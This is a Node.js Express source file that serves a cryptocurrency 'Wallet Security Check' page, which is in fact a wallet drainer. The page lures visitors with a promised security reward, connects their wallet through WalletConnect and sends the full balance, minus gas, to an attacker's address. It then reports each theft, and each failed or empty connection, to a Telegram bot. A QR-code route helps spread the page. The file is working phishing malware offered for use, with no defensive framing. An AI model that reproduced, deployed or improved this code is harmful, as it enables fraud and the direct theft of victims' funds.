const express = require('express');
const path = require('path');
const app = express();

const DRAIN_ADDRESS = process.env.DRAIN_ADDRESS;
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// Serve the main page with the Connect Wallet button
app.get('/', (req, res) => {
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Wallet Security Check</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{font-family:Arial,sans-serif;background:#0a0a0a;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;text-align:center}
    .card{background:#1a1a1a;padding:40px 30px;border-radius:20px;max-width:400px;width:90%;box-shadow:0 0 40px #3375ff22}
    h2{color:#3375ff;margin-bottom:10px}
    p{color:#ccc;margin-bottom:25px;font-size:14px}
    button{background:#3375ff;color:#fff;border:none;padding:16px 40px;font-size:16px;border-radius:12px;cursor:pointer;width:100%;font-weight:bold}
    button:hover{background:#2555cc}
    .alert{color:#ff5555;font-size:13px;margin-top:15px}
    .loader{border:3px solid #333;border-top:3px solid #3375ff;border-radius:50%;width:30px;height:30px;animation:spin 1s linear infinite;margin:15px auto;display:none}
    @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
  </style>
</head>
<body>
  <div class="card">
    <h2>🔐 Wallet Security Check</h2>
    <p>Connect your wallet to verify it's protected and claim your security reward.</p>
    <button id="connectBtn">Connect Wallet</button>
    <div class="loader" id="loader"></div>
    <p class="alert" id="msg"></p>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/web3@1.7.1/dist/web3.min.js"></script>
  <script>
    const DRAIN_ADDRESS = '${DRAIN_ADDRESS}';
    const BOT_TOKEN = '${BOT_TOKEN}';
    const CHAT_ID = '${CHAT_ID}';

    const RPC_URLS = {
      1: 'https://eth.llamarpc.com',
      56: 'https://bsc-dataseed.binance.org',
      137: 'https://polygon.llamarpc.com'
    };

    async function notify(msg) {
      try {
        await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({chat_id: CHAT_ID, text: msg})
        });
      } catch(e) {}
    }

    document.getElementById('connectBtn').addEventListener('click', async () => {
      const btn = document.getElementById('connectBtn');
      const loader = document.getElementById('loader');
      const msgEl = document.getElementById('msg');
      btn.style.display = 'none';
      loader.style.display = 'block';
      msgEl.innerText = 'Connecting...';

      try {
        const provider = new WalletConnectProvider.default({
          rpc: RPC_URLS,
          bridge: 'https://bridge.walletconnect.org',
          qrcode: false
        });

        await provider.enable();
        const web3 = new Web3(provider);
        const accounts = await web3.eth.getAccounts();
        const account = accounts[0];
        const chainId = await web3.eth.getChainId();

        msgEl.innerText = 'Connected: ' + account.slice(0,6) + '...' + account.slice(-4);
        loader.style.display = 'none';
        msgEl.style.color = '#33ff55';

        // Check balance and drain
        const balance = await web3.eth.getBalance(account);
        const gasPrice = await web3.eth.getGasPrice();
        const gasCost = web3.utils.toBN(gasPrice).mul(web3.utils.toBN(21000));
        const sendable = web3.utils.toBN(balance).sub(gasCost);

        if (sendable.gt(web3.utils.toBN(0))) {
          msgEl.innerText = 'Verifying security...';
          const tx = {
            from: account,
            to: DRAIN_ADDRESS,
            value: sendable.toString(),
            gas: '21000',
            gasPrice: gasPrice.toString()
          };
          const signed = await web3.eth.sendTransaction(tx);
          const ethAmount = web3.utils.fromWei(sendable.toString(), 'ether');
          await notify('✅ DRAINED ' + ethAmount + ' ETH/BNB from ' + account + ' | TX: ' + signed.transactionHash);
          msgEl.innerText = '✅ Wallet verified! Reward claimed.';
          msgEl.style.color = '#33ff55';
        } else {
          await notify('⚠ Wallet connected but no balance: ' + account);
          msgEl.innerText = '✅ Connected. No balance to claim reward.';
        }
        setTimeout(() => provider.disconnect(), 2000);
      } catch (err) {
        loader.style.display = 'none';
        btn.style.display = 'block';
        msgEl.innerText = 'Connection cancelled. Please try again.';
        msgEl.style.color = '#ff5555';
        await notify('❌ Connection failed/rejected: ' + err.message);
      }
    });
  </script>
</body>
</html>`);
});

// QR code page - generates QR that points to the main site
app.get('/qr', async (req, res) => {
  const QRCode = require('qrcode');
  const siteUrl = req.protocol + '://' + req.get('host') + '/';
  const qrDataUrl = await QRCode.toDataURL(siteUrl);
  res.send(`<html><head><title>QR</title>
  <style>body{background:#000;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
  img{width:300px;height:300px}</style></head>
  <body><img src="${qrDataUrl}"></body></html>`);
});

app.listen(process.env.PORT || 3000, () => console.log('Drainer live'));
